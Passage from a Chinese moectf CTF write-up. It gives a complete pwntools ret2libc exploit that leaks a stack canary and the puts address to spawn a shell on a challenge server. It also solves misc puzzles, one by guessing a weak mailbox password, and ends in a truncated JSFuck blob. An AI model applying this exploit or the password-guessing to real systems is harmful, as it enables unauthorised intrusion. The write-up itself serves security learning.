+<p>题目给出了<code>libc.so.6</code>文件，故考虑<strong>ret2libc</strong>，构造rop链先将函数返回至<code>puts</code>，输出puts函数的真实地址（储存在got表中），之后计算出libc的基址，再计算出libc中system函数与/bin/sh字符串的真实地址，最后构造rop链执行<code>system(&quot;/bin/sh&quot;)</code>即可getshell</p>
+<p>故最终构造exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'sec.arttnba3.cn'</span>,<span class="number">10003</span>)</span><br><span class="line">e = ELF(<span class="string">'./baby_canary'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">puts_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = e.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload1 = <span class="string">b'A'</span>*(<span class="number">0x4c</span><span class="number">-0xc</span>+<span class="number">1</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line">canary = u32(<span class="string">b'\x00'</span>+p.recv(<span class="number">3</span>))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'A'</span>*(<span class="number">0x4c</span><span class="number">-0xc</span>) + p32(canary) + <span class="string">b'A'</span>*(<span class="number">0xc</span><span class="number">-4</span>) + p32(<span class="number">0xdeadbeef</span>) + p32(puts_plt)+ p32(e.sym[<span class="string">'main'</span>]) + p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recvuntil(<span class="string">'flag!\n'</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = p.recv(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">sh_addr = libc_base + libc.search(<span class="string">b'/bin/sh'</span>).__next__()</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">payload3 = <span class="string">b'A'</span>*(<span class="number">0x4c</span><span class="number">-0xc</span>) + p32(canary) + <span class="string">b'A'</span>*(<span class="number">0xc</span><span class="number">-4</span>) + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>运行exp，成功getshell</p>
+<p><img src="https://i.loli.net/2020/08/29/v7Kau1Bop9rckdU.png" alt="image.png"></p>
+<p>得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;W0w_Y0u_c@n_e5cap3_fr0m_c4nary!&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-Misc"><a href="#0x02-Misc" class="headerlink" title="0x02.Misc"></a>0x02.Misc</h1><h2 id="简-单-的社工题"><a href="#简-单-的社工题" class="headerlink" title="简 单 的社工题"></a>简 单 的社工题</h2><p>提示贴吧，我们来到<code>moectf吧</code>，发现这样一个帖子</p>
+<img src="https://i.loli.net/2020/08/09/vd5xKPI8GijfU1J.jpg" alt="_Z1G_175TDBK@1F05F@355Q.jpg" style="zoom: 33%;" />
+
+<p>没有额外的信息，于是我们来到发帖人的主页面，发现发帖人只关注了一个人</p>
+<img src="https://i.loli.net/2020/08/09/NbqLYV6teWK5ac4.jpg" alt="6NGB@MPTK@K3CHM3UK7IN_C.jpg" style="zoom:33%;" />
+
+<p>我们来到这个人的主页面看看</p>
+<img src="https://i.loli.net/2020/08/09/GncNxdL3VBOEqme.jpg" alt="4_ZSME_W6O4V@_X_OT2_I_K.jpg" style="zoom: 33%;" />
+
+<p>没有收获，我们又查看他所关注的贴吧</p>
+<img src="https://i.loli.net/2020/08/09/QCOLqFobD9VR6Pz.jpg" alt="8_89V_9@_634~83__YVG_8D.jpg" style="zoom:33%;" />
+
+<p>从下往上看是：<code>923431ourmail.</code></p>
+<p>推测应该是一个邮箱，但是点的后面的域名不清楚</p>
+<p>百度ourmail得到<code>ourmail.cn</code>，于是我们知道了一个叫做ourmail的东西XD</p>
+<p>在ourmail搜索<a href="mailto:923431@ourmail.cn">923431@ourmail.cn</a>，果然有</p>
+<p><img src="https://i.loli.net/2020/08/09/vuzECAyDQGUibWx.png" alt="image.png"></p>
+<p>没给密码，推测是弱口令，尝试了几个弱口令得到加群密码<code>a123456</code></p>
+<p>进入后发现这样一个邮件：</p>
+<p><img src="https://i.loli.net/2020/08/09/o6kIlzaSBTD8Vs2.png" alt="image.png"></p>
+<p>发帖人叫<code>/s</code>，邮件内容是<code>address: 1O9JFcsUyqQ7T85WXmHH6nQ</code>，还回了个<code>a3cj</code></p>
+<p>/s/address很明显是百度网盘链接的格式</p>
+<p>输入<code>pan.baidu.com/s/1O9JFcsUyqQ7T85WXmHH6nQ</code>，果然得到了一个分析文件的链接 </p>
+<p><img src="https://i.loli.net/2020/08/09/M6dEt8lkYCz3XFm.png" alt="image.png"></p>
+<p>我们将<code>a3cj</code>作为提取码输入，成功获得文件，下载，解压得如下文本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bW9lY3RmJTdCdzB3X1kwdV9jNG5fZjFuZF9tM19vdVQlMjElN0Q&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>比较明显的base64特征，解密，得到flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;w0w_Y0u_c4n_f1nd_m3_ouT!&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="不-会-吧-？-就-这-¿"><a href="#不-会-吧-？-就-这-¿" class="headerlink" title="不 会 吧 ？ 就 这 ¿"></a>不 会 吧 ？ 就 这 ¿</h2><p>老阴阳人le</p>
+<p>图片改后缀zip解压得文本如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">不会吧？ 就这¿ 就这¿ 不会吧？ 不会吧？ 就这¿ 不会吧？ 就这¿ </span><br><span class="line">就这¿ 就这¿ 就这¿ 就这¿ 不会吧？ 不会吧？ 就这¿ 就这¿ </span><br><span class="line">不会吧？ 就这¿ 不会吧？ 就这¿ 不会吧？ 不会吧？ 不会吧？ 就这¿ </span><br><span class="line">不会吧？ 不会吧？ 不会吧？ 不会吧？ 不会吧？ 就这¿ 不会吧？ 就这¿ </span><br><span class="line">不会吧？ 不会吧？ 不会吧？ 就这¿ 不会吧？ 不会吧？ 不会吧？ 就这¿ </span><br><span class="line">就这¿ 就这¿ 就这¿ 不会吧？ 就这¿ 不会吧？ 不会吧？ 就这¿ </span><br><span class="line">就这¿ 就这¿ 不会吧？ 就这¿ 不会吧？ 不会吧？ 就这¿ 就这¿ </span><br><span class="line">就这¿ 就这¿ 不会吧？ 就这¿ 不会吧？ 不会吧？ 不会吧？ 就这¿ </span><br><span class="line">不会吧？ 不会吧？ 不会吧？ 不会吧？ 不会吧？ 不会吧？ 就这¿ 就这¿ </span><br><span class="line">不会吧？ 就这¿ 不会吧？ 不会吧？ 就这¿ 不会吧？ 就这¿ 就这¿ </span><br><span class="line">就这¿ 就这¿ 就这¿ 就这¿ 不会吧？ 不会吧？ 就这¿ 就这¿ </span><br><span class="line">就这¿ 不会吧？ 不会吧？ 不会吧？ 就这¿ 不会吧？ 不会吧？ 就这¿ </span><br><span class="line">不会吧？ 就这¿ 就这¿ 就这¿ 不会吧？ 不会吧？ 就这¿ 就这¿ </span><br><span class="line">不会吧？ 就这¿ 就这¿ 不会吧？ 不会吧？ 不会吧？ 不会吧？ 就这¿ </span><br><span class="line">不会吧？ 不会吧？ 不会吧？ 不会吧？ 不会吧？ 就这¿ 不会吧？ 就这¿ </span><br><span class="line">就这¿ 就这¿ 不会吧？ 就这¿ 不会吧？ 不会吧？ 不会吧？ 就这¿ </span><br><span class="line">就这¿ 就这¿ 就这¿ 不会吧？ 就这¿ 不会吧？ 不会吧？ 就这¿ </span><br><span class="line">不会吧？ 就这¿ 就这¿ 就这¿ 不会吧？ 不会吧？ 就这¿ 就这¿ </span><br><span class="line">不会吧？ 不会吧？ 就这¿ 就这¿ 不会吧？ 就这¿ 不会吧？ 就这¿ </span><br><span class="line">不会吧？ 不会吧？ 不会吧？ 不会吧？ 不会吧？ 不会吧？ 就这¿ 就这¿</span><br></pre></td></tr></table></figure>
+
+<p>文本中只有<code>不会吧？</code>和<code>就这¿</code>，推测是二进制</p>
+<p>每行长度都是八个词，末尾都是“就这¿”，ASCII码的二进制最高位都是0，故推测是ASCII码逆序</p>
+<p>工具人手动转码结果如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">10011010</span><br><span class="line">00001100</span><br><span class="line">10101110</span><br><span class="line">11111010</span><br><span class="line">11101110</span><br><span class="line">00010110</span><br><span class="line">00101100</span><br><span class="line">00101110</span><br><span class="line">11111100</span><br><span class="line">10110100</span><br><span class="line">00001100</span><br><span class="line">01110110</span><br><span class="line">10001100</span><br><span class="line">10011110</span><br><span class="line">11111010</span><br><span class="line">00101110</span><br><span class="line">00010110</span><br><span class="line">10001100</span><br><span class="line">11001010</span><br><span class="line">11111100</span><br></pre></td></tr></table></figure>
+
+<p>逆序后转成数字就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">89</span><br><span class="line">48</span><br><span class="line">117</span><br><span class="line">95</span><br><span class="line">119</span><br><span class="line">104</span><br><span class="line">52</span><br><span class="line">116</span><br><span class="line">63</span><br><span class="line">45</span><br><span class="line">48</span><br><span class="line">110</span><br><span class="line">49</span><br><span class="line">121</span><br><span class="line">95</span><br><span class="line">116</span><br><span class="line">104</span><br><span class="line">49</span><br><span class="line">83</span><br><span class="line">63</span><br></pre></td></tr></table></figure>
+
+<p>对照ASCII码表即得flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Y0u_wh4t?-0n1y_th1S?&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="A3FXCK"><a href="#A3FXCK" class="headerlink" title="A3FXCK"></a>A3FXCK</h2><p>惯例的图片后缀名改zip解压得到这样一个文本文档</p>
+<p><img src="https://i.loli.net/2020/10/08/La7GHyJqUgs8Ypk.png" alt="image.png"></p>
+<p>开头第一行提示<code>123456</code>对应<code>[]()+!</code>，而文本中存在<code>luoq1an</code>、<code>arttnba2</code>、<code>arttnba3</code>、<code>luoqi4n</code>、<code>arttnba5</code>、<code>arttnba6</code>，故考虑进行字符串替换</p>
+<p>得到如下文本</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[!+[]+!+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+(!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[